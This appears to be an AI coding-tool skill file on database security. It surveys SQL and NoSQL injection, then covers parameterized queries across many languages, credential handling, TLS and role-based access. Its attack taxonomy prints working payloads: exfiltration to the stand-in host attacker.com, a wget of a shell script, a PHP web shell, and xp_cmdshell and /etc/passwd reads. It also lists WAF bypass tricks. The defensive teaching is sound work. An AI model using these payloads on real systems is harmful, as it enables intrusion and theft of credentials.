---
name: database-security
description: Database security mastery — SQL injection (all types), NoSQL injection, query hardening, ORM security, database hardening, access control, encryption, audit, and penetration testing
license: MIT
compatibility: opencode
metadata:
  audience: database-administrators, backend-developers, security-engineers
  domain: database, security
  paradigm: defense-in-depth
  capabilities:
    - sql-injection-prevention
    - nosql-injection-prevention
    - query-parameterization
    - orm-security
    - database-hardening
    - access-control
    - encryption-at-rest-transit
    - audit-logging
    - database-pentesting
    - secure-configuration
    - backup-security
    - connection-string-security
  integrates_with:
    - database-postgres
    - backend-nodejs
    - backend-go
    - backend-python
    - security-audit
---

# Database Security & Hardening

> **Tier**: God-Level  
> **Paradigm**: Defense-in-Depth  
> **Coverage**: SQL Injection → NoSQL Injection → Hardening → Encryption → Audit → Pentesting

---

## 1. SQL Injection — Complete Taxonomy

### 1.1 Classification Tree

```
                            ┌──────────────────────────┐
                            │     SQL INJECTION         │
                            └───────────┬──────────────┘
                                        │
                  ┌─────────────────────┼─────────────────────┐
                  │                     │                     │
          ┌───────┴───────┐    ┌───────┴───────┐    ┌───────┴───────┐
          │   In-Band     │    │  Inferential  │    │  Out-of-Band  │
          │   (Direct)    │    │   (Blind)     │    │  (Indirect)   │
          └───────┬───────┘    └───────┬───────┘    └───────┬───────┘
                  │                    │                    │
          ┌───────┴───────┐    ┌───────┴───────┐    ┌───────┴───────┐
          │  Error-based  │    │ Boolean-based │    │   DNS/HTTP    │
          │  Union-based  │    │  Time-based   │    │  Exfiltration │
          └───────────────┘    └───────────────┘    └───────────────┘

                          ┌──────────────────────────┐
                          │   DERIVED VARIANTS        │
                          ├──────────────────────────┤
                          │ • Second-order (Stored)   │
                          │ • Lateral (Cross-query)   │
                          │ • HTTP Header Injection   │
                          │ • JSON/XML Injection      │
                          └──────────────────────────┘
```

### 1.2 In-Band SQLi (Error-Based)

Attacker uses error messages from the database to infer structure.

**Unsafe:**
```sql
SELECT id, name, email FROM users WHERE id = '1' UNION SELECT null, table_name, null FROM information_schema.tables --
```

**PostgreSQL error-based extraction:**
```sql
' OR 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int) --
-- ERROR: invalid input syntax for type integer: "users"
```

### 1.3 In-Band SQLi (Union-Based)

Direct data extraction via `UNION SELECT`.

**Classic attack:**
```sql
' UNION SELECT id, password_hash, email FROM users --
```

**Column count probing:**
```sql
' ORDER BY 1 --  (no error → column exists)
' ORDER BY 10 -- (error → max columns < 10)
```

### 1.4 Inferential (Blind) SQLi — Boolean-Based

No error messages, no data returned. Attacker infers truth via response differences.

```sql
' AND SUBSTRING((SELECT password_hash FROM users WHERE id=1),1,1) = 'a' --
-- If page loads normally → first char is 'a'
-- If page errors/empty → first char is not 'a'
```

**Binary search optimization:**
```sql
' AND ASCII(SUBSTRING((SELECT password_hash FROM users WHERE id=1),1,1)) > 77 --
-- Reduces 256 possibilities to ~8 requests per character
```

### 1.5 Inferential (Blind) SQLi — Time-Based

No visible response difference. Attacker uses `SLEEP`/`pg_sleep`/`WAITFOR DELAY`.

**MySQL:**
```sql
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>77, SLEEP(2), 0) --
```

**PostgreSQL:**
```sql
' AND CASE WHEN (SELECT current_database()) = 'prod' THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

**MSSQL:**
```sql
'; IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5' --
```

### 1.6 Out-of-Band SQLi

Data exfiltration via DNS/HTTP when direct/output channels are blocked.

**PostgreSQL DNS exfiltration via `dblink`:**
```sql
'; SELECT dblink_connect((SELECT 'host=' || (SELECT password_hash FROM users WHERE id=1) || '.attacker.com dbname=postgres')) --
```

**MySQL DNS exfiltration via `LOAD_FILE`:**
```sql
' LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test')) --
```

**MSSQL `xp_cmdshell` HTTP exfiltration:**
```sql
'; EXEC xp_cmdshell 'powershell Invoke-WebRequest -Uri http://attacker.com/?data=' + (SELECT password_hash FROM users WHERE id=1) --
```

### 1.7 Second-Order SQLi

Injection stored in database, executed later when the stored value is used unsafely.

**Step 1 — Inject:**
```sql
-- Attacker registers with username: '; DROP TABLE users; --
INSERT INTO users (username) VALUES (''; DROP TABLE users; --');
```

**Step 2 — Trigger:**
```sql
-- Admin tool that unsafely uses stored username
EXECUTE('SELECT * FROM audit WHERE username = ''' + @username + '''');
-- Executes: SELECT * FROM audit WHERE username = ''; DROP TABLE users; --'
```

### 1.8 Lateral SQLi

Injection in one query affects a subsequent query in the same session — relies on session state manipulation.

**PostgreSQL session variable manipulation:**
```sql
'; SET myapp.user_role = 'admin'; SELECT current_setting('myapp.user_role') --
```

### 1.9 HTTP Header Injection

Attack vectors via headers commonly logged or processed into queries.

```http
User-Agent: ' OR 1=1 --
X-Forwarded-For: ' UNION SELECT * FROM credit_cards --
Cookie: session='; EXEC xp_cmdshell 'whoami' --
Referer: ' AND pg_sleep(5) --
```

### 1.10 DBMS-Specific Injection

#### PostgreSQL

| Technique | Payload | Risk |
|-----------|---------|------|
| `pg_sleep` Time-based | `' AND pg_sleep(5) --` | Very High |
| `xmlagg` data extract | `' AND (SELECT xmlagg(xmlelement(name t, table_name)) FROM information_schema.tables) IS NOT NULL --` | High |
| `generate_series` | `' UNION SELECT generate_series(1,100) --` | Medium |
| `dblink` OOB | `'; SELECT dblink_connect('host=attacker.com dbname=x') --` | Critical |
| `COPY FROM PROGRAM` | `'; COPY my_table FROM PROGRAM 'wget http://attacker.com/shell.sh' --` | Critical (RCE) |

#### MySQL

| Technique | Payload | Risk |
|-----------|---------|------|
| `LOAD_FILE` | `' UNION SELECT LOAD_FILE('/etc/passwd') --` | High |
| `INTO OUTFILE` | `' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/shell.php' --` | Critical (RCE) |
| `BENCHMARK` | `' OR BENCHMARK(5000000, MD5('test')) --` | Medium |
| `INFORMATION_SCHEMA` | `' UNION SELECT table_name, column_name FROM information_schema.columns --` | High |

#### MSSQL

| Technique | Payload | Risk |
|-----------|---------|------|
| `xp_cmdshell` | `'; EXEC xp_cmdshell 'whoami' --` | Critical (RCE) |
| `OPENROWSET` | `'; SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.com','sa','pwd', 'SELECT 1') --` | Critical |
| `BULK INSERT` | `'; BULK INSERT dbo.users FROM '\\attacker.com\share\data.txt' --` | High |

#### SQLite

| Technique | Payload | Risk |
|-----------|---------|------|
| `ATTACH DATABASE` | `'; ATTACH DATABASE '/tmp/evil.db' AS evil; CREATE TABLE evil.t(data); --` | High |
| `load_extension` | `'; SELECT load_extension('/tmp/malicious.dll') --` | Critical (RCE) |

---

## 2. SQL Injection — Prevention (Deep)

### 2.1 How Parameterized Queries Work

```
Traditional concatenation:
  "SELECT * FROM users WHERE id = '" + input + "'"
  → DB receives: "SELECT * FROM users WHERE id = ''; DROP TABLE users; --'"
  → Parsed as malicious SQL

Parameterized query:
  "SELECT * FROM users WHERE id = $1"
  → DB receives query template separately from parameters
  → Parser creates execution plan: SELECT * FROM users WHERE id = $1
  → Parameters bound AFTER parsing: $1 = "'; DROP TABLE users; --"
  → Value treated as DATA, not SQL syntax
  → Result: SELECT * FROM users WHERE id = '\''; DROP TABLE users; --'\'''
  → Safe: no rows returned (no such id exists)
```

### 2.2 Prepared Statement Lifecycle

```
Client                          Database
  │                                │
  │── PREPARE stmt (SELECT ...) ──→│  Parse + Plan (SQL structure fixed)
  │                                │
  │── EXECUTE stmt ($1 = 'safe') ─→│  Bind parameter → Execute plan
  │←────────── result ────────────│
  │                                │
  │── EXECUTE stmt ($1 = 'evil') ─→│  Bind parameter → Execute SAME plan
  │←────────── result ────────────│  Value treated as data, NOT code
  │                                │
```

### 2.3 Language-Specific Safe vs Unsafe

#### TypeScript (node-postgres)

```typescript
// ❌ UNSAFE — String concatenation
const query = `SELECT * FROM users WHERE id = '${userId}'`;
await pool.query(query);

// ✅ SAFE — Parameterized
await pool.query('SELECT * FROM users WHERE id = $1', [userId]);

// ❌ UNSAFE — Dynamic table/column names in parameterized query
await pool.query(`SELECT * FROM ${tableName} WHERE id = $1`, [id]);
// tableName is interpolated before parameterization → SQLi if attacker controls it

// ✅ SAFE — Allow-list for dynamic identifiers
const allowedTables = ['users', 'orders', 'products'];
if (!allowedTables.includes(tableName)) throw new Error('Invalid table');
await pool.query(`SELECT * FROM ${tableName} WHERE id = $1`, [id]);
```

#### TypeScript (Prisma)

```typescript
// ✅ SAFE — Prisma Client queries are parameterized
await prisma.user.findUnique({ where: { id: userId } });

// ⚠️ CAUTION — Raw queries need explicit parameterization
// ❌ UNSAFE
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = '${userId}'`);

// ✅ SAFE
await prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`;

// ✅ SAFE — Tagged template auto-parameterizes
await prisma.$queryRaw`
  SELECT u.*, p.name
  FROM users u
  JOIN profiles p ON p.user_id = u.id
  WHERE u.email = ${email}
    AND u.status = ${status}
`;
```

#### TypeScript (TypeORM)

```typescript
// ❌ UNSAFE
const users = await dataSource.query(`SELECT * FROM users WHERE id = '${id}'`);

// ✅ SAFE — Parameterized query
const users = await dataSource.query('SELECT * FROM users WHERE id = $1', [id]);

// ✅ SAFE — QueryBuilder (auto-parameterized)
const users = await dataSource
  .getRepository(User)
  .createQueryBuilder('u')
  .where('u.id = :id', { id })
  .getMany();
```

#### Go (pgx)

```go
// ❌ UNSAFE
query := fmt.Sprintf("SELECT * FROM users WHERE id = '%s'", userInput)
rows, _ := db.Query(query)

// ✅ SAFE — Parameterized
rows, err := db.Query("SELECT * FROM users WHERE id = $1", userInput)

// ✅ SAFE — pgxpool
rows, err := pool.Query(ctx, "SELECT * FROM users WHERE id = $1", userInput)

// ❌ UNSAFE — Dynamic identifiers
rows, err := db.Query(fmt.Sprintf("SELECT * FROM %s WHERE id = $1", table), id)

// ✅ SAFE — Allow-list
validTables := map[string]bool{"users": true, "orders": true}
if !validTables[table] { return errors.New("invalid table") }
rows, err := db.Query(fmt.Sprintf("SELECT * FROM %s WHERE id = $1", table), id)
```

#### Go (GORM)

```go
// ❌ UNSAFE — Raw SQL string concat
db.Raw(fmt.Sprintf("SELECT * FROM users WHERE id = '%s'", input)).Scan(&user)

// ✅ SAFE — Parameterized raw
db.Raw("SELECT * FROM users WHERE id = ?", input).Scan(&user)

// ✅ SAFE — GORM query methods (auto-parameterized)
db.Where("id = ?", input).First(&user)

// ❌ UNSAFE — Where with string formatting
db.Where(fmt.Sprintf("id = '%s'", input)).First(&user)

// ✅ SAFE — Struct-based query
db.Where(&User{ID: input}).First(&user)
```

#### Python (psycopg2)

```python
# ❌ UNSAFE
cur.execute(f"SELECT * FROM users WHERE id = '{user_id}'")

# ✅ SAFE — Parameterized (positional)
cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# ✅ SAFE — Parameterized (named)
cur.execute("SELECT * FROM users WHERE id = %(id)s", {"id": user_id})
```

#### Python (SQLAlchemy)

```python
# ❌ UNSAFE — Raw string
session.execute(text(f"SELECT * FROM users WHERE id = '{uid}'"))

# ✅ SAFE — Parameterized text()
session.execute(text("SELECT * FROM users WHERE id = :uid"), {"uid": uid})

# ✅ SAFE — ORM query (auto-parameterized)
session.query(User).filter(User.id == uid).first()

# ⚠️ CAUTION — text() without bind params
# ✅ SAFE
session.execute(text("SELECT * FROM users WHERE id = :uid").bindparams(uid=uid))
```

#### Rust (sqlx)

```rust
// ❌ UNSAFE — String formatting
let query = format!("SELECT * FROM users WHERE id = '{}'", input);
sqlx::query(&query).fetch_all(&pool).await?;

// ✅ SAFE — Prepared query
sqlx::query("SELECT * FROM users WHERE id = $1")
    .bind(input)
    .fetch_all(&pool)
    .await?;

// ✅ SAFE — QueryBuilder
let users: Vec<User> = sqlx::query_as("SELECT * FROM users WHERE id = $1")
    .bind(input)
    .fetch_all(&pool)
    .await?;

// ⚠️ SAFE with compiler verification
let user = sqlx::query!("SELECT * FROM users WHERE id = $1", input)
    .fetch_one(&pool)
    .await?;
```

#### Rust (Diesel)

```rust
// ✅ SAFE — Diesel ORM (compile-time checked)
users.filter(id.eq(input)).first(&mut conn)?;

// ⚠️ CAUTION — Raw SQL in Diesel
// ❌ UNSAFE
diesel::sql_query(format!("SELECT * FROM users WHERE id = '{}'", input)).load(&mut conn)?;

// ✅ SAFE
diesel::sql_query("SELECT * FROM users WHERE id = $1")
    .bind::<Text, _>(input)
    .load(&mut conn)?;
```

### 2.4 Prevention Decision Tree

```
Is the SQL query dynamic?
  │
  ├── NO  → Static query → Safe
  │
  └── YES → Does it include user input?
              │
              ├── NO → Static query with server-side values → Review for safety
              │
              └── YES → Is the input in a value position (WHERE, SET, VALUES)?
                          │
                          ├── YES → Use parameterized query / prepared statement
                          │         → Is parameterization available?
                          │              ├── YES → USE IT
                          │              └── NO  → Use escape function + allow-list
                          │
                          └── NO  → Is it an identifier (table, column, function name)?
                                      │
                                      ├── NO  → Is it SQL structure (ORDER BY, LIMIT)?
                                      │         │
                                      │         ├── YES → Allow-list the entire structure
                                      │         │
                                      │         └── NO  → Reconsider design (red flag)
                                      │
                                      └── YES → Allow-list identifier against known values
                                                → NEVER interpolate directly
                                                → Use double-quoting as defense-in-depth only

Is the ORM being used?
  │
  ├── YES → Are you using raw queries?
  │         │
  │         ├── NO  → ORM provides safe defaults → Verify ORM version for CVEs
  │         │
  │         └── YES → Are you using the ORM's safe raw query API?
  │                    │
  │                    ├── YES → Verify parameter binding syntax
  │                    │
  │                    └── NO  → Switch to parameterized raw API
  │
  └── NO  → Validate all inputs + use parameterized queries
```

### 2.5 WAF Bypass Techniques — Defensive Awareness

Attackers bypass WAFs using these techniques. Understanding them helps you build deeper defense.

```sql
-- Bypass 1: Case variation (WAF regex is case-sensitive)
' UnIoN SeLeCT * FrOm users --

-- Bypass 2: Comment insertion
' UN/**/ION SEL/**/ECT * FROM users --
' U/**/NION /**/SELECT /**/ * FROM users --

-- Bypass 3: Double URL encoding
%25%32%37 (decodes to %27 → decodes to ')

-- Bypass 4: Null bytes
%00' UNION SELECT * FROM users --

-- Bypass 5: Hex encoding
' UNION SELECT 0x7573657273, 0x70617373776f7264 --

-- Bypass 6: HTTP parameter pollution (HPP)
?id=1&id=2&id=' UNION SELECT * FROM users --

-- Bypass 7: Multipart parameter pollution
?id=1' UNION SELECT * FROM users -- (as multipart/form-data)

-- Bypass 8: Unicode normalization
'⁯UNION⁯SELECT⁯*⁯FROM⁯users-- (invisible Unicode)

-- Bypass 9: SQL Server's exec()
'; EXEC('SELECT * FROM users') --

-- Bypass 10: MySQL's INTO variable
' UNION SELECT * FROM users INTO @a --
```

**Defensive countermeasures:**
- **Layer 1 (Input Validation)**: Type check, length check, pattern validation
- **Layer 2 (Parameterization)**: Prepared statements render all WAF bypasses irrelevant
- **Layer 3 (WAF)**: Modern ML-based WAF (Cloudflare WAF ML, AWS WAF with SQL injection rules)
- **Layer 4 (Database Firewall)**: Query pattern analysis at DB proxy level
- **Layer 5 (Audit)**: Detect and alert on unusual query patterns

### 2.6 Escape Functions — Why They're NOT Enough

```typescript
// Escape functions CAN be bypassed — NEVER rely on them alone

// MySQL: mysql_real_escape_string
// Bypass when multi-byte character sets are used:
// SET NAMES GBK → ' OR 1=1-- with escape becomes \' OR 1=1--
// But if attacker sends %bf%27 → 0xbf5c is a valid GBK character
// → The backslash is consumed → ' is unescaped → injection!

// PostgreSQL: PQescapeStringConn
// More robust, but encoding context matters
// Never reliable for LIKE clauses:
// input: %_% → escape doesn't help with wildcard matching
```

**Rule**: Escape functions are a **supplementary** defense, NEVER the primary one.

**Safe LIKE escaping:**
```typescript
function escapeLike(input: string): string {
  return input
    .replace(/\\/g, '\\\\')
    .replace(/%/g, '\\%')
    .replace(/_/g, '\\_')
    .replace(/'/g, "''");
}
// Still use parameterization + this escape
```

---

## 3. NoSQL Injection

### 3.1 MongoDB Injection

#### `$where` Injection (JavaScript Evaluation)

```typescript
// ❌ UNSAFE — Query with $where and string interpolation
const unsafe = await User.find({
  $where: `this.username === '${input}'`
});

// If input = "' || this.password[0] == 'a' || 'x' == 'x"
// → this.username === '' || this.password[0] == 'a' || 'x' == 'x'
// → Returns all users whose password starts with 'a'!

// ✅ SAFE — Use query operators instead
await User.find({ username: input });

// ✅ SAFE — If $where is truly necessary, use parameterized syntax
await User.find({
  $where: `this.username === '${input.replace(/'/g, "\\'")}'`
});
// But better: avoid $where entirely
```

#### `$ne`, `$regex`, `$gt` Injection

```typescript
// ❌ UNSAFE — Attacker sends JSON object instead of string
// Request body: { "username": { "$ne": "" }, "password": { "$ne": "" } }
await User.findOne({ username: req.body.username, password: req.body.password });
// → Returns first user WHERE username != "" AND password != ""
// → AUTHENTICATION BYPASS!

// ❌ UNSAFE — $regex injection
// input = { "$regex": ".*" } → matches everything
await User.find({ email: input });

// ❌ UNSAFE — $gt injection for enumeration
// input = { "$gt": "" } → returns first alphabetically
await User.find({ role: input });

// ✅ SAFE — Validate that query params are strings/primitives
function sanitizeQuery(value: unknown): string {
  if (typeof value !== 'string') throw new Error('Invalid input');
  return value;
}

// ✅ SAFE — Use schema-level type enforcement (Mongoose)
const userSchema = new Schema({
  username: { type: String, required: true },  // Mongoose strips non-string types
  role: { type: String, enum: ['user', 'admin'] }
});

// ✅ SAFE — Additional validation middleware
app.use('/api/users', (req, res, next) => {
  for (const key of Object.keys(req.query)) {
    if (typeof req.query[key] !== 'string') {
      return res.status(400).json({ error: 'Invalid input type' });
    }
  }
  next();
});
```

#### JSON Injection (MongoDB Extended JSON)

```typescript
// ❌ UNSAFE — Direct JSON deserialization into query
const query = JSON.parse(req.body.filter);
// Attacker sends: { "username": "admin", "password": { "$regex": ".*" } }
await User.find(query);

// ✅ SAFE — Whitelist allowed fields and enforce types
const allowedFilters = ['username', 'email', 'role'];
const query: Record<string, string> = {};
for (const key of Object.keys(JSON.parse(req.body.filter))) {
  if (allowedFilters.includes(key) && typeof parsed[key] === 'string') {
    query[key] = parsed[key];
  }
}
await User.find(query);
```

### 3.2 Redis Injection

#### Command Injection via EVAL

```typescript
// ❌ UNSAFE — Dynamic EVAL with user input
await redis.eval(`return redis.call('GET', '${userInput}')`);

// If input = "'; redis.call('FLUSHALL'); return '';"
// → Executes: return redis.call('GET', ''); redis.call('FLUSHALL'); return '';'
// → Entire database flushed!

// ✅ SAFE — Use parameterized EVAL
await redis.eval(
  `return redis.call('GET', KEYS[1])`,
  1,  // number of keys
  userInput
);

// ✅ SAFE — Use proper Redis commands instead of EVAL
await redis.get(userInput);

// ✅ SAFE — Validate keyspace
const allowedKeys = new Set(['session:', 'config:', 'user:']);
if (![...allowedKeys].some(prefix => userInput.startsWith(prefix))) {
  throw new Error('Invalid key');
}
```

#### Connection Injection

```go
// ❌ UNSAFE — Direct string concat in Redis commands
cmd := fmt.Sprintf("SET key_%s %s", userID, userValue)
redisClient.Do(ctx, cmd)

// ✅ SAFE — Use argument-based API
redisClient.Do(ctx, "SET", fmt.Sprintf("key_%s", userID), userValue)
```

### 3.3 Cassandra/CQL Injection

```python
# ❌ UNSAFE — String concatenation in CQL
session.execute(f"SELECT * FROM users WHERE username = '{username}'")

# If username = "' ALLOW FILTERING;"
# → Query: SELECT * FROM users WHERE username = '' ALLOW FILTERING;
# → Bypasses index requirement, allows full table scan

# ✅ SAFE — Parameterized CQL
session.execute(
    "SELECT * FROM users WHERE username = %s",
    (username,)
)
```

### 3.4 Couchbase N1QL Injection

```javascript
// ❌ UNSAFE
const result = await cluster.query(
  `SELECT * FROM bucket WHERE type = 'user' AND username = '${username}'`
);

// ✅ SAFE — N1QL parameterized
const result = await cluster.query(
  'SELECT * FROM bucket WHERE type = "user" AND username = $username',
  { parameters: { username } }
);
```

### 3.5 NoSQL Prevention Decision Tree

```
Is the input used in a database query?
  │
  ├── YES → Is it a value or an operator?
  │         │
  │         ├── VALUE → Use parameterized queries
  │         │
  │         └── OPERATOR → Allow-list operators + validate structure
  │
  ├── Is the query dynamic EVAL/script (Redis, MongoDB $where)?
  │   │
  │   ├── YES → Eliminate if possible
  │   │         If unavoidable: parameterize + sandbox + restrict commands
  │   │
  │   └── NO  → Use driver's safe API (argument-based, not string-based)
  │
  └── Is the input parsed from JSON/XML?
      │
      ├── YES → Validate schema + enforce types before query
      │         Strip operator keys unless explicitly allowed
      │
      └── NO  → Normal string input → parameterized query
```

---

## 4. Database Authentication Security

### 4.1 Password Policies

#### Application → Database Passwords

```typescript
// ✅ SAFE — Environment variable with validation
const dbPassword = process.env.DB_PASSWORD;
if (!dbPassword || dbPassword.length < 20) {
  throw new Error('Database password must be at least 20 characters');
}

// ✅ SAFE — Generate strong password
// openssl rand -base64 32 → outputs 44 character password
// Use: pwgen -s 48 1

// ✅ SAFE — Rotation-ready pattern
class DatabaseCredential {
  constructor(
    private readonly secretArn: string,
    private readonly rotationIntervalMs: number = 86400000 // 24h
  ) {}

  async getPassword(): Promise<string> {
    // Check cache age
    if (this.cached && (Date.now() - this.cacheTime) < this.rotationIntervalMs) {
      return this.cached;
    }
    // Fetch from vault (AWS Secrets Manager, HashiCorp Vault)
    this.cached = await this.fetchFromVault(this.secretArn);
    this.cacheTime = Date.now();
    return this.cached;
  }
}
```

#### Database User Passwords (PostgreSQL)

```sql
-- ✅ SAFE — Use scram-sha-256 (NOT md5)
ALTER SYSTEM SET password_encryption = 'scram-sha-256';
SELECT pg_reload_conf();

-- ✅ SAFE — Create users with strong passwords
CREATE ROLE app_user WITH LOGIN PASSWORD 'strong-password-here';

-- ✅ SAFE — Force password change on first login
ALTER ROLE app_user VALID UNTIL '2026-05-18'; -- expires tomorrow

-- ✅ SAFE — Password expiration policy
ALTER ROLE app_user VALID UNTIL '2026-06-17';
```

### 4.2 Connection String Security

```typescript
// ❌ UNSAFE — Connection string in source code
const connectionString = 'postgresql://admin:password123@localhost:5432/prod';

// ❌ UNSAFE — In config files committed to git
// database.config.ts contains: postgresql://admin:password321@prod-db:5432/db

// ✅ SAFE — Environment variables (with .env in .gitignore)
const connectionString = process.env.DATABASE_URL;

// ✅ SAFE — Use connection string components separately
const pool = new Pool({
  host: process.env.DB_HOST,      // not localhost in prod
  port: parseInt(process.env.DB_PORT || '5432'),
  database: process.env.DB_NAME,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  ssl: { rejectUnauthorized: true },  // always in production
  max: 20,  // connection pool limits
});

// ✅ SAFE — Kubernetes secrets
// apiVersion: v1
// kind: Secret
// metadata:
//   name: db-credentials
// type: Opaque
// stringData:
//   DB_PASSWORD: "..."

// ✅ SAFE — HashiCorp Vault dynamic secrets
// vault write database/creds/app-role ttl=1h
```

### 4.3 SSL/TLS for Database Connections

```typescript
// ❌ UNSAFE — Disabling SSL in production
const pool = new Pool({
  connectionString,
  ssl: false  // ALL TRAFFIC IN PLAINTEXT!
});

// ❌ UNSAFE — Accepting any certificate
const pool = new Pool({
  connectionString,
  ssl: { rejectUnauthorized: false }  // MITM POSSIBLE!
});

// ✅ SAFE — Full SSL verification
const pool = new Pool({
  connectionString,
  ssl: {
    rejectUnauthorized: true,
    ca: fs.readFileSync('/etc/ssl/certs/db-ca-cert.pem').toString(),
    key: fs.readFileSync('/etc/ssl/private/db-client-key.pem').toString(),
    cert: fs.readFileSync('/etc/ssl/certs/db-client-cert.pem').toString(),
  }
});

// ✅ SAFE — PostgreSQL require SSL
// postgresql.conf:
// ssl = on
// ssl_cert_file = 'server.crt'
// ssl_key_file = 'server.key'
// ssl_ca_file = 'root.crt'
// ssl_crl_file = 'root.crl'

// pg_hba.conf (require client cert):
// hostssl all all 0.0.0.0/0 scram-sha-256 clientcert=1
```

### 4.4 Certificate Rotation

```bash
# Generate new CA
openssl genrsa -out root.key 4096
openssl req -x509 -new -nodes -key root.key -sha256 -days 3650 -out root.crt

# Generate server cert (valid 1 year for rotation practice)
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr
openssl x509 -req -in server.csr -CA root.crt -CAkey root.key \
  -CAcreateserial -out server.crt -days 365 -sha256

# Hot reload certs (PostgreSQL)
SELECT pg_reload_conf();
-- No restart needed for cert changes in PostgreSQL 12+

# Automate rotation (example with certbot-like approach)
# 1. Generate new cert
# 2. Copy to DB server
# 3. pg_reload_conf()
# 4. Verify connection with new cert
# 5. Revoke old cert
```

### 4.5 Service Accounts — Least Privilege per Microservice

```sql
-- ❌ UNSAFE — Single shared superuser for all services
CREATE ROLE shared_admin WITH LOGIN SUPERUSER PASSWORD 'shared';

-- ❌ UNSAFE — Application connecting as table owner
CREATE ROLE app_owner WITH LOGIN PASSWORD 'pass' CREATEDB;
-- app_owner can drop tables, truncate, etc.

-- ✅ SAFE — Dedicated role per microservice
-- User Service (read/write users table only)
CREATE ROLE user_service WITH LOGIN PASSWORD 'strong-pw-1';
GRANT USAGE ON SCHEMA public TO user_service;
GRANT SELECT, INSERT, UPDATE, DELETE ON users TO user_service;
GRANT SELECT ON user_profiles TO user_service;  -- read-only for profiles
REVOKE ALL ON credit_cards FROM user_service;     -- explicitly deny

-- Order Service (read/write orders only)
CREATE ROLE order_service WITH LOGIN PASSWORD 'strong-pw-2';
GRANT USAGE ON SCHEMA public TO order_service;
GRANT SELECT, INSERT, UPDATE ON orders TO order_service;
GRANT SELECT ON products TO order_service;         -- read-only reference
REVOKE ALL ON users FROM order_service;

-- Reporting Service (read-only)
CREATE ROLE reporting_service WITH LOGIN PASSWORD 'strong-pw-3';
GRANT USAGE ON SCHEMA public TO reporting_service;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO reporting_service;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT SELECT ON TABLES TO reporting_service;
```

### 4.6 Connection Pooling Security

```ini
# PgBouncer — secure configuration
[databases]
prod = host=localhost port=5432 dbname=prod

[pgbouncer]
listen_addr = 127.0.0.1     # Only localhost, not 0.0.0.0
listen_port = 6432
auth_type = scram-sha-256   # Not trust or plain
auth_file = /etc/pgbouncer/userlist.txt
auth_user = pgbouncer_admin
pool_mode = transaction      # Reset session state between transactions
max_client_conn = 100
default_pool_size = 20
server_reset_query = DISCARD ALL  # Clear session state
server_check_query = SELECT 1
server_check_delay = 30

# Security hardening
client_tls_sslmode = verify-full
client_tls_ca_file = /etc/ssl/certs/ca.crt
client_tls_cert_file = /etc/ssl/certs/pgbouncer.crt
client_tls_key_file = /etc/ssl/private/pgbouncer.key
server_tls_sslmode = verify-full
```

---

## 5. Privilege Management & RBAC

### 5.1 Principle of Least Privilege

```
                  ┌─────────────────────────────────────────┐
                  │         DATABASE PRIVILEGE MODEL          │
                  └─────────────────────────────────────────┘

  SUPERUSER ─────────────────────────────────────────────────────┐
    │  (PostgreSQL superuser / MySQL root)                       │
    │   → Only for OS-level DBA tasks                           │
    │   → NEVER for application connections                     │
    │   → MFA required                                          │
    ▼                                                            │
  ADMIN ────────────────────────────────────────────────────────┤
    │  (CREATE ROLE, CREATE DATABASE, DDL grants)               │
    │   → Schema migrations, user management                    │
    │   → Separated from application user                       │
    ▼                                                            │
  FULL-ACCESS USER ─────────────────────────────────────────────┤
    │  (All DML on assigned tables)                             │
    │   → Internal tools, admin panels                          │
    │   → Audit logged                                          │
    ▼                                                            │
  WRITE-ONLY USER ──────────────────────────────────────────────┤
    │  (INSERT, UPDATE on specific tables)                      │
    │   → Data ingestion services                               │
    ▼                                                            │
  READ-ONLY USER ───────────────────────────────────────────────┘
    (SELECT on specific tables/views)
     → Reporting, analytics, read-replicas
```

### 5.2 PostgreSQL RBAC Implementation

```sql
-- Create role hierarchy
CREATE ROLE db_readonly;
CREATE ROLE db_readwrite;
CREATE ROLE db_admin;
CREATE ROLE db_owner;

-- Grant privileges to roles
-- Read-only
GRANT CONNECT ON DATABASE prod TO db_readonly;
GRANT USAGE ON SCHEMA public TO db_readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO db_readonly;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO db_readonly;

-- Read-write
GRANT db_readonly TO db_readwrite;  -- Inherit read-only privileges
GRANT INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO db_readwrite;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT INSERT, UPDATE, DELETE ON TABLES TO db_readwrite;

-- Admin
GRANT db_readwrite TO db_admin;     -- Inherit read-write
GRANT CREATE ON SCHEMA public TO db_admin;
GRANT CREATE ON DATABASE prod TO db_admin;

-- Assign application users to roles
CREATE ROLE app_reporting WITH LOGIN PASSWORD 'strong-pw-ro';
GRANT db_readonly TO app_reporting;

CREATE ROLE app_api WITH LOGIN PASSWORD 'strong-pw-rw';
GRANT db_readwrite TO app_api;

CREATE ROLE app_migration WITH LOGIN PASSWORD 'strong-pw-admin';
GRANT db_admin TO app_migration;
```

### 5.3 Column-Level Security

```sql
-- Grant access to specific columns
GRANT SELECT (id, name, email, role) ON users TO app_api;
-- app_api cannot SELECT password_hash, ssn, credit_card columns

GRANT SELECT (id, name) ON users TO app_reporting;
-- Reports can only see id and name, nothing sensitive
```

### 5.4 Row-Level Security (RLS)

```sql
-- Enable RLS on table
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;

-- ✅ SAFE — Tenant isolation policy
CREATE POLICY tenant_isolation ON orders
  USING (tenant_id = current_setting('app.tenant_id')::UUID);

-- ✅ SAFE — User can only see own orders
CREATE POLICY user_orders ON orders
  FOR ALL
  USING (user_id = current_setting('app.user_id')::UUID)
  WITH CHECK (user_id = current_setting('app.user_id')::UUID);

-- ✅ SAFE — Admin can see all
CREATE POLICY admin_override ON orders
  FOR ALL
